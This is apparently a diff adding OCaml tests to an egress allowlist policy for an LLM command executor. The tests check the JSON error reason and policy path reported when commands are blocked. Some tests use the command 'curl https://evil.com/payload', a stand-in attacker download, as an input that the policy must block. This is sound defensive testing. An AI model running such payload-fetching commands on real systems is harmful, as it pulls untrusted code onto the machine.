@@ -165,6 +165,87 @@ let test_of_file_missing_blocks_git_url_command () =
       assert (allowed = [])
   | Allowed -> assert false
 
+(* ── Leak 11 (PR-Eg3): expected_policy_path makes the failure mode
+   actionable for the LLM caller and the operator. *)
+
+let json_field_string field json =
+  match json with
+  | `Assoc kv -> (
+      match List.assoc_opt field kv with
+      | Some (`String s) -> Some s
+      | _ -> None)
+  | _ -> None
+
+let string_contains haystack needle =
+  let h = String.length haystack and n = String.length needle in
+  if n = 0 then true
+  else if n > h then false
+  else
+    let rec loop i =
+      if i + n > h then false
+      else if String.sub haystack i n = needle then true
+      else loop (i + 1)
+    in
+    loop 0
+
+let test_blocked_json_with_path_empty_allowlist () =
+  (* Empty allowlist (file missing or unreadable) — reason should
+     instruct the operator to seed the file. *)
+  let policy = Egress_policy.empty in
+  let result =
+    Egress_policy.check_command policy
+      "git clone https://github.com/ocaml/ocaml"
+  in
+  let path = "/Users/dancer/me/.masc/playground/docker/executor/egress.json" in
+  let json =
+    Egress_policy.blocked_to_json ~expected_policy_path:path result
+  in
+  let parsed = Yojson.Safe.from_string json in
+  assert (json_field_string "expected_policy_path" parsed = Some path);
+  match json_field_string "reason" parsed with
+  | Some reason ->
+      assert (string_contains reason "empty or unreadable");
+      assert (string_contains reason path)
+  | None -> assert false
+
+let test_blocked_json_with_path_unmatched_domain () =
+  (* Non-empty allowlist, but the attempted domain isn't on it.
+     Reason should distinguish this from the empty case. *)
+  let policy =
+    Egress_policy.of_allowed ~source:"(test)" [ "*.github.com" ]
+  in
+  let result =
+    Egress_policy.check_command policy "curl https://evil.com/payload"
+  in
+  let path = "/tmp/egress.json" in
+  let json =
+    Egress_policy.blocked_to_json ~expected_policy_path:path result
+  in
+  let parsed = Yojson.Safe.from_string json in
+  assert (json_field_string "expected_policy_path" parsed = Some path);
+  match json_field_string "reason" parsed with
+  | Some reason ->
+      assert (string_contains reason "evil.com");
+      assert (string_contains reason "not in egress allowlist")
+  | None -> assert false
+
+let test_blocked_json_without_path_preserves_legacy_schema () =
+  (* Backward compat: callers without path context get the old
+     two-field schema unchanged. *)
+  let policy = Egress_policy.empty in
+  let result =
+    Egress_policy.check_command policy "curl https://evil.com"
+  in
+  let json = Egress_policy.blocked_to_json result in
+  let parsed = Yojson.Safe.from_string json in
+  match parsed with
+  | `Assoc kv ->
+      assert (List.assoc_opt "error" kv = Some (`String "egress_blocked"));
+      assert (List.assoc_opt "attempted" kv = Some (`String "evil.com"));
+      assert (List.assoc_opt "expected_policy_path" kv = None);
+      assert (List.assoc_opt "reason" kv = None)
+  | _ -> assert false
+
 let () =
   test_empty_blocks_outbound ();
   test_empty_allows_commands_without_urls ();
@@ -183,4 +264,7 @@ let () =
   test_of_json_string_not_array ();
   test_of_json_string_empty_array_blocks_outbound ();
   test_of_file_missing_blocks_git_url_command ();
+  test_blocked_json_with_path_empty_allowlist ();
+  test_blocked_json_with_path_unmatched_domain ();
+  test_blocked_json_without_path_preserves_legacy_schema ();
   print_endline "[test_egress_policy] all tests passed"
